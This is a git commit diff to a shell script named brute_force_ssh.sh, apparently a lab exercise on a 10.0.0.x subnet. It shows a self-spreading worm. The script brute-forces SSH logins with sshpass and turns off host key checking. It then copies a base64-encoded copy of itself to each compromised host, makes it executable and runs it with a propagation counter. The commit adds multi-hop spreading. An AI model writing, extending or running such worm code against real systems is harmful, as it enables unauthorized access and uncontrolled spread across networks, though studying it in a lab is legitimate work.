e6e9de16e8b8396420324ca97e883b8255c4712e
albert <aviba@hotmail.es>
2023-05-11 19:19:40 +0200

    worm number of attempts

--- brute_force_ssh.sh
+++ brute_force_ssh.sh
@@ -1,11 +1,16 @@
 #!/bin/bash
 
+if [ "$1" -eq "0" ]; then
+	exit
+fi
+
 # Variables to complete (i.e. IP addressing scheme and worm location)
 IP_SUBNET="10.0.0."
 MIN_HOST=1
 MAX_HOST=6
 WORM="$0"
-
+PROPAGATION=$1
+VICTIM_PROPAGATION=`expr $PROPAGATION - 1`
 
 # Data to use in the brute force attack
 USER="test"
@@ -35,28 +40,40 @@ if [ $IP = $MY_IP ]; then
 	SEED=`expr $SEED % $NUM_HOSTS`
 	IP=${IPS[$SEED]}
 fi
-echo "[ $MY_IP] The target IP is $IP"
+# echo "[ $MY_IP] The target IP is $IP"
 
 
 # Brute force against the other hosts
-for PASS in "${PASSWORDS[@]}"
+for VICTIM in $(seq $PROPAGATION)
 do
-	echo "[ $MY_IP] Trying user = $USER with password = $PASS"
+	echo "[ $MY_IP] The target IP of the propagation number $VICTIM is $IP"
+	for PASS in "${PASSWORDS[@]}"
+	do
+		echo "[ $MY_IP] Trying user = $USER with password = $PASS"
 
-	# Execute the worm on the remote host using sshpass
-	sshpass -p $PASS ssh -o StrictHostKeyChecking=no $USER@10.0.0.1 \
-		"echo \"$ENCODED\" | base64 -d > \$HOME/$NEW_NAME ; \
-		chmod +x \$HOME/$NEW_NAME ; \
-		sleep 10s ; \
-		./$NEW_NAME" # 2> /dev/null
+		# Execute the worm on the remote host using sshpass
+		sshpass -p $PASS ssh -o StrictHostKeyChecking=no $USER@$IP \
+			"echo \"$ENCODED\" | base64 -d > \$HOME/$NEW_NAME ; \
+			chmod +x \$HOME/$NEW_NAME ; \
+			sleep 10s ; \
+			./$NEW_NAME $VICTIM_PROPAGATION" # 2> /dev/null
 
-	if [ $? -eq 0 ]; then
-	    echo "OK"
-	else
-	    echo "FAIL"
+		if [ $? -eq 0 ]; then
+		    echo "OK"
+		else
+		    echo "FAIL"
+		fi
+	done
+	
+	# Obtain the next victim
+	SEED=`expr $SEED + 1`
+	IP=${IPS[$SEED]}
+	if [ $IP = $MY_IP ]; then
+		SEED=`expr $SEED + 1`
+		SEED=`expr $SEED % $NUM_HOSTS`
+		IP=${IPS[$SEED]}
 	fi
 done
-
 
 
 
